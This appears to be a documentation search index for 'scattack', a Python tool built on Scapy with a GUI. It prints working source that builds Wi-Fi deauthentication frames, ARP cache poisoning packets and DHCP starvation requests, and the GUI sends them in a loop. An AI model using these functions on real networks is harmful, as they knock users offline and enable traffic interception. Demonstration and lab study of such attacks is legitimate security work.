{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"scattack","text":"<p>Scattack was created to demonstrate the use of Scapy to perform Wifi deauthentication, ARP cache poisoning and DHCP Starvation attacks. It is inspired by several github repos and aims to create a single platform to launch several attacks.</p> <p>The implemented attacks are:</p> <ul> <li>Wifi deauthentication, using the <code>scapy.layers.dot11</code> module to send deauthentication packets to a target access point.</li> <li>ARP cache poisoning, using the <code>scapy.layers.l2</code> module to send ARP packets to a target host.</li> <li>DHCP Starvation, using the <code>scapy.layers.dhcp</code> module to send DHCP requests to a target DHCP server.</li> </ul>"},{"location":"reference/","title":"Reference","text":""},{"location":"reference/#scattack.core","title":"<code>core</code>","text":""},{"location":"reference/#scattack.core.send_packet","title":"<code>send_packet(pkt, iface)</code>","text":"<p>Send Layer 2 packet.</p> <p>Parameters:</p> Name Type Description Default <code>pkt</code> <code>Packet</code> <p>Packet to send</p> required <code>iface</code> <code>str</code> <p>name of the interface to send the packet on</p> required <p>Returns:     None</p> Source code in <code>src/scattack/core/__init__.py</code> <pre><code>def send_packet(pkt: Packet, iface: str) -&gt; None:\n    \"\"\"Send Layer 2 packet.\n\n    Args:\n        pkt (Packet): Packet to send\n        iface (str): name of the interface to send the packet on\n    Returns:\n        None\"\"\"\n    return sendp(pkt, iface=iface, verbose=False)\n</code></pre>"},{"location":"reference/#scattack.core.arp_poison","title":"<code>arp_poison</code>","text":"<p>This module is responsible for ARP poisoning.</p>"},{"location":"reference/#scattack.core.arp_poison.create_arppoison_packet","title":"<code>create_arppoison_packet(target_ip, spoofed_ip, spoofed_mac=None)</code>","text":"<p>Create ARP packet.</p> <p>Parameters:</p> Name Type Description Default <code>target_mac</code> <code>str</code> <p>MAC address of the target</p> required <code>target_ip</code> <code>str</code> <p>IP address of the target</p> required <code>spoofed_ip</code> <code>str</code> <p>IP address of the spoofed IP address</p> required <p>Returns:     Ether: ARP packet</p> Source code in <code>src/scattack/core/arp_poison.py</code> <pre><code>def create_arppoison_packet(\n    target_ip: str,\n    spoofed_ip: str,\n    spoofed_mac: str | None = None,\n) -&gt; Packet:\n    \"\"\"Create ARP packet.\n\n    Args:\n        target_mac (str): MAC address of the target\n        target_ip (str): IP address of the target\n        spoofed_ip (str): IP address of the spoofed IP address\n    Returns:\n        Ether: ARP packet\"\"\"\n    return Ether(dst=ETHER_BROADCAST, src=spoofed_mac) / ARP(\n        op=\"is-at\",\n        psrc=spoofed_ip,\n        pdst=target_ip,\n        hwdst=ETHER_ANY,\n        hwsrc=spoofed_mac,\n    )\n</code></pre>"},{"location":"reference/#scattack.core.dhcp_starve","title":"<code>dhcp_starve</code>","text":""},{"location":"reference/#scattack.core.dhcp_starve.create_dhcp_starve_packet","title":"<code>create_dhcp_starve_packet(ip, target_mac=ETHER_BROADCAST)</code>","text":"<p>Create DHCP packet.</p> <p>Parameters:</p> Name Type Description Default <code>ip</code> <code>str</code> <p>IP address to request</p> required <code>server_ip</code> <code>str</code> <p>IP address of the server</p> required <p>Returns:     Packet: DHCP packet</p> Source code in <code>src/scattack/core/dhcp_starve.py</code> <pre><code>def create_dhcp_starve_packet(ip: str, target_mac: str = ETHER_BROADCAST) -&gt; Packet:\n    \"\"\"Create DHCP packet.\n\n    Args:\n        ip (str): IP address to request\n        server_ip (str): IP address of the server\n    Returns:\n        Packet: DHCP packet\"\"\"\n    mac = RandMAC()\n    return (\n        Ether(src=mac, dst=target_mac)\n        / IP(src=IP_ANY, dst=IP_BROADCAST)\n        / UDP(sport=68, dport=67)\n        / BOOTP(chaddr=mac)\n        / DHCP(options=[(\"message-type\", \"request\"), (\"requested_addr\", ip), \"end\"])\n    )\n</code></pre>"},{"location":"reference/#scattack.core.utils","title":"<code>utils</code>","text":"<p>This module contains some useful constants.</p>"},{"location":"reference/#scattack.core.wifi_deauth","title":"<code>wifi_deauth</code>","text":"<p>This module contains functions to create 802.11 deauthentification packets.</p>"},{"location":"reference/#scattack.core.wifi_deauth.create_deauth_packet","title":"<code>create_deauth_packet(target_mac, ap_bssid)</code>","text":"<p>Create 802.11 deauthentification packet.</p> <p>Parameters:</p> Name Type Description Default <code>target_mac</code> <code>str</code> <p>MAC address of the target</p> required <code>ap_bssid</code> <code>str</code> <p>BSSID of the spoofed access point</p> required <p>Returns:     Packet: 802.11 deauthentification packet</p> Source code in <code>src/scattack/core/wifi_deauth.py</code> <pre><code>def create_deauth_packet(target_mac: str, ap_bssid: str) -&gt; Packet:\n    \"\"\"Create 802.11 deauthentification packet.\n\n    Args:\n        target_mac (str): MAC address of the target\n        ap_bssid (str): BSSID of the spoofed access point\n    Returns:\n        Packet: 802.11 deauthentification packet\"\"\"\n    return (\n        RadioTap()\n        / Dot11(\n            addr1=target_mac,\n            addr2=ap_bssid,\n            addr3=ap_bssid,\n        )\n        / Dot11Deauth(reason=7)\n    )\n</code></pre>"},{"location":"reference/#scattack.gui","title":"<code>gui</code>","text":""},{"location":"reference/#scattack.gui.__main__","title":"<code>__main__</code>","text":""},{"location":"reference/#scattack.gui.app","title":"<code>app</code>","text":""},{"location":"reference/#scattack.gui.app.App","title":"<code>App</code>","text":"<p>             Bases: <code>Tk</code></p> Source code in <code>src/scattack/gui/app.py</code> <pre><code>class App(tkinter.Tk):\n    def __init__(\n        self,\n        *args,\n        logger: Logger,\n        result_queue: ResultQueue,\n        cmd_queue: CommandQueue,\n        **kwargs,\n    ):\n        super().__init__(*args, **kwargs)\n        self.logger = logger\n\n        self.result_queue = result_queue\n        self.cmd_queue = cmd_queue\n        self.tab_cmd_queue = TabCommandQueue()\n        self.callbacks = {}\n\n        self.alert_window = None\n\n        self.title(\"SCAttack\")\n        self.protocol(\"WM_DELETE_WINDOW\", self.quit)\n        self.geometry(\"800x600\")\n        self.minsize(500, 400)\n        self.tab_view = TabView(self, queue=self.tab_cmd_queue)\n        self.tab_view.pack(fill=\"both\", expand=True)\n\n        self.after(RESCHEDULE_INTERVAL, self.result_listener)\n        self.after(RESCHEDULE_INTERVAL, self.command_req_listener)\n\n    def command_req_listener(self):\n        while not self.tab_cmd_queue.empty():\n            try:\n                req = self.tab_cmd_queue.get_nowait()\n            except:\n                break\n\n            self.logger.debug(\n                \"A new command request has been popped: %s (%r)\",\n                req.command_id,\n                type(req).__name__,\n            )\n\n            match req:\n                case CommandStartRequest(\n                    callback, fun, args, kwargs, still_valid, command_id\n                ):\n                    self.logger.debug(\"Starting command %s\", command_id)\n                    self.callbacks[command_id] = callback\n                    self.cmd_queue.put(\n                        StartCommand(command_id, fun, args, kwargs, still_valid)\n                    )\n                case CommandStopRequest(command_id):\n                    self.logger.debug(\"Stopping command %s\", command_id)\n                    self.cmd_queue.put(StopCommand(command_id))\n\n            self.tab_cmd_queue.task_done()\n        # Reschedule the listener\n        self.after(RESCHEDULE_INTERVAL, self.command_req_listener)\n\n    def result_listener(self):\n        \"\"\"Listen for results from the command executor\"\"\"\n        while not self.result_queue.empty():\n            try:\n                result = self.result_queue.get_nowait()\n            except:\n                break\n\n            self.logger.debug(\n                \"A new result has been popped: %s\",\n                result.command_id,\n            )\n            self.on_result(result)\n            self.result_queue.task_done()\n        # Reschedule the listener\n        self.after(RESCHEDULE_INTERVAL, self.result_listener)\n\n    def on_result(self, event: CommandEvent):\n        \"\"\"Handle a result from the command executor\"\"\"\n        self.logger.debug(\"Handling result %s\", event)\n        self.logger.debug(\"Callbacks: %s\", repr(self.callbacks))\n\n        self.callbacks[event.command_id](event)\n\n        match event:\n            case CommandCompleted(id, result):\n                self.logger.debug(\"Command %s completed with result %s\", id, result)\n                self.callbacks.pop(event.command_id)\n\n                match result:\n                    case None | AbortedCommandExecution():\n                        pass\n                    case Exception() as e:\n                        self.show_error(e)\n\n    def show_error(self, e: Exception):\n        self.toplevel_window = AlertWindow(self, message=str(e))\n\n    def quit(self, event=None):\n        self.destroy()\n\n    def run(self):\n        self.mainloop()\n</code></pre>"},{"location":"reference/#scattack.gui.app.App.on_result","title":"<code>on_result(event)</code>","text":"<p>Handle a result from the command executor</p> Source code in <code>src/scattack/gui/app.py</code> <pre><code>def on_result(self, event: CommandEvent):\n    \"\"\"Handle a result from the command executor\"\"\"\n    self.logger.debug(\"Handling result %s\", event)\n    self.logger.debug(\"Callbacks: %s\", repr(self.callbacks))\n\n    self.callbacks[event.command_id](event)\n\n    match event:\n        case CommandCompleted(id, result):\n            self.logger.debug(\"Command %s completed with result %s\", id, result)\n            self.callbacks.pop(event.command_id)\n\n            match result:\n                case None | AbortedCommandExecution():\n                    pass\n                case Exception() as e:\n                    self.show_error(e)\n</code></pre>"},{"location":"reference/#scattack.gui.app.App.result_listener","title":"<code>result_listener()</code>","text":"<p>Listen for results from the command executor</p> Source code in <code>src/scattack/gui/app.py</code> <pre><code>def result_listener(self):\n    \"\"\"Listen for results from the command executor\"\"\"\n    while not self.result_queue.empty():\n        try:\n            result = self.result_queue.get_nowait()\n        except:\n            break\n\n        self.logger.debug(\n            \"A new result has been popped: %s\",\n            result.command_id,\n        )\n        self.on_result(result)\n        self.result_queue.task_done()\n    # Reschedule the listener\n    self.after(RESCHEDULE_INTERVAL, self.result_listener)\n</code></pre>"},{"location":"reference/#scattack.gui.command","title":"<code>command</code>","text":""},{"location":"reference/#scattack.gui.command.CommandEventBase","title":"<code>CommandEventBase</code>  <code>dataclass</code>","text":"Source code in <code>src/scattack/gui/command.py</code> <pre><code>@dataclass\nclass CommandEventBase:\n    command_id: CommandId\n    \"\"\"The id of the command\"\"\"\n</code></pre>"},{"location":"reference/#scattack.gui.command.CommandEventBase.command_id","title":"<code>command_id: CommandId</code>  <code>instance-attribute</code>","text":"<p>The id of the command</p>"},{"location":"reference/#scattack.gui.command.StartCommand","title":"<code>StartCommand</code>  <code>dataclass</code>","text":"Source code in <code>src/scattack/gui/command.py</code> <pre><code>@dataclass\nclass StartCommand:\n    id: CommandId\n    \"\"\"The unique id of the command\"\"\"\n    fun: Callable[..., Any]\n    \"\"\"The function to execute\"\"\"\n    args: Iterable\n    \"\"\"The arguments to pass to the function\"\"\"\n    kwargs: dict[str, Any]\n    \"\"\"The keyword arguments to pass to the function\"\"\"\n    condition: Callable[[], bool]\n    \"\"\"The condition to check if the command should still be executed\"\"\"\n</code></pre>"},{"location":"reference/#scattack.gui.command.StartCommand.args","title":"<code>args: Iterable</code>  <code>instance-attribute</code>","text":"<p>The arguments to pass to the function</p>"},{"location":"reference/#scattack.gui.command.StartCommand.condition","title":"<code>condition: Callable[[], bool]</code>  <code>instance-attribute</code>","text":"<p>The condition to check if the command should still be executed</p>"},{"location":"reference/#scattack.gui.command.StartCommand.fun","title":"<code>fun: Callable[..., Any]</code>  <code>instance-attribute</code>","text":"<p>The function to execute</p>"},{"location":"reference/#scattack.gui.command.StartCommand.id","title":"<code>id: CommandId</code>  <code>instance-attribute</code>","text":"<p>The unique id of the command</p>"},{"location":"reference/#scattack.gui.command.StartCommand.kwargs","title":"<code>kwargs: dict[str, Any]</code>  <code>instance-attribute</code>","text":"<p>The keyword arguments to pass to the function</p>"},{"location":"reference/#scattack.gui.executor","title":"<code>executor</code>","text":""},{"location":"reference/#scattack.gui.executor.AbortedCommandExecution","title":"<code>AbortedCommandExecution</code>","text":"<p>             Bases: <code>Exception</code></p> <p>An exception raised when a command execution is aborted</p> Source code in <code>src/scattack/gui/executor.py</code> <pre><code>class AbortedCommandExecution(Exception):\n    \"\"\"An exception raised when a command execution is aborted\"\"\"\n\n    pass\n</code></pre>"},{"location":"reference/#scattack.gui.executor.CommandExecutor","title":"<code>CommandExecutor</code>","text":"<p>             Bases: <code>Thread</code></p> <p>A thread that executes commands</p> Source code in <code>src/scattack/gui/executor.py</code> <pre><code>class CommandExecutor(Thread):\n    \"\"\"A thread that executes commands\"\"\"\n\n    cmd_queue: CommandQueue\n    \"\"\"The queue of commands to execute\"\"\"\n    res_queue: ResultQueue\n    \"\"\"The queue of results from the commands\"\"\"\n    logger: Logger\n    \"\"\"The logger for the executor\"\"\"\n\n    def __init__(\n        self,\n        cmd_queue: CommandQueue,\n        res_queue: ResultQueue,\n        logger: Logger = getLogger(\"CommandExecutor\"),\n    ):\n        super().__init__()\n        self.cmd_queue = cmd_queue\n        self.res_queue = res_queue\n        self.logger = logger\n\n    def stop(self):\n        \"\"\"Stop the executor\"\"\"\n        self.cmd_queue.put(StopExecutor())\n\n    def run(self):\n        \"\"\"Execute the commands in the queue\"\"\"\n\n        while True:\n            command = self.cmd_queue.get()\n            self.logger.info(f\"Executing command {command}\")\n\n            match command:\n                case StartCommand(id, fun, args, kwargs, still_valid):\n                    self.res_queue.put(CommandScheduled(id))\n                    result = None\n                    try:\n                        while self.cmd_queue.empty() and still_valid():\n                            self.logger.debug(\n                                (\n                                    f\"Executing command {command} ({id})\"\n                                    f\"with args {args} and kwargs {kwargs}\"\n                                )\n                            )\n                            fun(*args, **kwargs)\n                        if not self.cmd_queue.empty():\n                            result = AbortedCommandExecution(id)\n                            self.logger.info(f\"Command {command} ({id}) aborted\")\n                    except Exception as e:\n                        result = e\n                        self.logger.error(\n                            f\"Error executing command {command}: {result}\"\n                        )\n                    finally:\n                        self.res_queue.put(CommandCompleted(id, result))\n                        self.logger.info(f\"Command {command} ({id}) completed\")\n\n                case StopCommand(id):\n                    self.logger.debug(f\"Command {command} ({id}) stopped\")\n\n                case StopExecutor():\n                    self.logger.info(\"Stopping executor\")\n                    return\n\n            self.cmd_queue.task_done()\n</code></pre>"},{"location":"reference/#scattack.gui.executor.CommandExecutor.cmd_queue","title":"<code>cmd_queue: CommandQueue = cmd_queue</code>  <code>instance-attribute</code>","text":"<p>The queue of commands to execute</p>"},{"location":"reference/#scattack.gui.executor.CommandExecutor.logger","title":"<code>logger: Logger = logger</code>  <code>instance-attribute</code>","text":"<p>The logger for the executor</p>"},{"location":"reference/#scattack.gui.executor.CommandExecutor.res_queue","title":"<code>res_queue: ResultQueue = res_queue</code>  <code>instance-attribute</code>","text":"<p>The queue of results from the commands</p>"},{"location":"reference/#scattack.gui.executor.CommandExecutor.run","title":"<code>run()</code>","text":"<p>Execute the commands in the queue</p> Source code in <code>src/scattack/gui/executor.py</code> <pre><code>def run(self):\n    \"\"\"Execute the commands in the queue\"\"\"\n\n    while True:\n        command = self.cmd_queue.get()\n        self.logger.info(f\"Executing command {command}\")\n\n        match command:\n            case StartCommand(id, fun, args, kwargs, still_valid):\n                self.res_queue.put(CommandScheduled(id))\n                result = None\n                try:\n                    while self.cmd_queue.empty() and still_valid():\n                        self.logger.debug(\n                            (\n                                f\"Executing command {command} ({id})\"\n                                f\"with args {args} and kwargs {kwargs}\"\n                            )\n                        )\n                        fun(*args, **kwargs)\n                    if not self.cmd_queue.empty():\n                        result = AbortedCommandExecution(id)\n                        self.logger.info(f\"Command {command} ({id}) aborted\")\n                except Exception as e:\n                    result = e\n                    self.logger.error(\n                        f\"Error executing command {command}: {result}\"\n                    )\n                finally:\n                    self.res_queue.put(CommandCompleted(id, result))\n                    self.logger.info(f\"Command {command} ({id}) completed\")\n\n            case StopCommand(id):\n                self.logger.debug(f\"Command {command} ({id}) stopped\")\n\n            case StopExecutor():\n                self.logger.info(\"Stopping executor\")\n                return\n\n        self.cmd_queue.task_done()\n</code></pre>"},{"location":"reference/#scattack.gui.executor.CommandExecutor.stop","title":"<code>stop()</code>","text":"<p>Stop the executor</p> Source code in <code>src/scattack/gui/executor.py</code> <pre><code>def stop(self):\n    \"\"\"Stop the executor\"\"\"\n    self.cmd_queue.put(StopExecutor())\n</code></pre>"},{"location":"reference/#scattack.gui.utils","title":"<code>utils</code>","text":""},{"location":"reference/#scattack.gui.utils.BaseOptions","title":"<code>BaseOptions</code>  <code>dataclass</code>","text":"Source code in <code>src/scattack/gui/utils.py</code> <pre><code>@dataclass\nclass BaseOptions:\n    iface: str = \"\"\n    \"\"\"Interface\"\"\"\n    interval: float = 0.1\n    \"\"\"Interval between packets\"\"\"\n</code></pre>"},{"location":"reference/#scattack.gui.utils.BaseOptions.iface","title":"<code>iface: str = ''</code>  <code>class-attribute</code> <code>instance-attribute</code>","text":"<p>Interface</p>"},{"location":"reference/#scattack.gui.utils.BaseOptions.interval","title":"<code>interval: float = 0.1</code>  <code>class-attribute</code> <code>instance-attribute</code>","text":"<p>Interval between packets</p>"},{"location":"reference/#scattack.gui.validation","title":"<code>validation</code>","text":""},{"location":"reference/#scattack.gui.validation.is_float","title":"<code>is_float(value)</code>","text":"<p>Check if the input is a valid float.</p> <p>Parameters:</p> Name Type Description Default <code>value</code> <code>str</code> <p>Float</p> required <p>Returns:</p> Name Type Description <code>bool</code> <code>bool</code> <p>True if the input is a valid float, False otherwise</p> Source code in <code>src/scattack/gui/validation.py</code> <pre><code>def is_float(value: str) -&gt; bool:\n    \"\"\"Check if the input is a valid float.\n\n    Args:\n        value (str): Float\n\n    Returns:\n        bool: True if the input is a valid float, False otherwise\"\"\"\n    return value.replace(\".\", \"\", 1).isdecimal()\n</code></pre>"},{"location":"reference/#scattack.gui.validation.is_int","title":"<code>is_int(value)</code>","text":"<p>Check if the input is a valid integer.</p> <p>Parameters:</p> Name Type Description Default <code>value</code> <code>str</code> <p>Integer</p> required <p>Returns:</p> Name Type Description <code>bool</code> <code>bool</code> <p>True if the input is a valid integer, False otherwise</p> Source code in <code>src/scattack/gui/validation.py</code> <pre><code>def is_int(value: str) -&gt; bool:\n    \"\"\"Check if the input is a valid integer.\n\n    Args:\n        value (str): Integer\n\n    Returns:\n        bool: True if the input is a valid integer, False otherwise\"\"\"\n    return value.isdecimal()\n</code></pre>"},{"location":"reference/#scattack.gui.validation.is_ip_address","title":"<code>is_ip_address(addr)</code>","text":"<p>Check if the input is a valid IP address.</p> <p>Parameters:</p> Name Type Description Default <code>addr</code> <code>str</code> <p>IP address</p> required <p>Returns:</p> Name Type Description <code>bool</code> <code>bool</code> <p>True if the input is a valid IP address, False otherwise</p> Source code in <code>src/scattack/gui/validation.py</code> <pre><code>def is_ip_address(addr: str) -&gt; bool:\n    \"\"\"Check if the input is a valid IP address.\n\n    Args:\n        addr (str): IP address\n\n    Returns:\n        bool: True if the input is a valid IP address, False otherwise\"\"\"\n    try:\n        ip_address(addr)\n        return True\n    except ValueError:\n        return False\n</code></pre>"},{"location":"reference/#scattack.gui.validation.is_ip_network","title":"<code>is_ip_network(addr)</code>","text":"<p>Check if the input is a valid IP network.</p> <p>Parameters:</p> Name Type Description Default <code>addr</code> <code>str</code> <p>IP network</p> required <p>Returns:</p> Name Type Description <code>bool</code> <code>bool</code> <p>True if the input is a valid IP network, False otherwise</p> Source code in <code>src/scattack/gui/validation.py</code> <pre><code>def is_ip_network(addr: str) -&gt; bool:\n    \"\"\"Check if the input is a valid IP network.\n\n    Args:\n        addr (str): IP network\n\n    Returns:\n        bool: True if the input is a valid IP network, False otherwise\"\"\"\n    try:\n        ip_network(addr)\n        return True\n    except ValueError:\n        return False\n</code></pre>"},{"location":"reference/#scattack.gui.validation.is_mac_address","title":"<code>is_mac_address(mac_address)</code>","text":"<p>Check if the input is a valid MAC address.</p> <p>Parameters:</p> Name Type Description Default <code>mac_address</code> <code>str</code> <p>MAC address</p> required <p>Returns:</p> Name Type Description <code>bool</code> <code>bool</code> <p>True if the input is a valid MAC address, False otherwise</p> Source code in <code>src/scattack/gui/validation.py</code> <pre><code>def is_mac_address(mac_address: str) -&gt; bool:\n    \"\"\"Check if the input is a valid MAC address.\n\n    Args:\n        mac_address (str): MAC address\n\n    Returns:\n        bool: True if the input is a valid MAC address, False otherwise\"\"\"\n    return bool(match(r\"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$\", mac_address))\n</code></pre>"}]}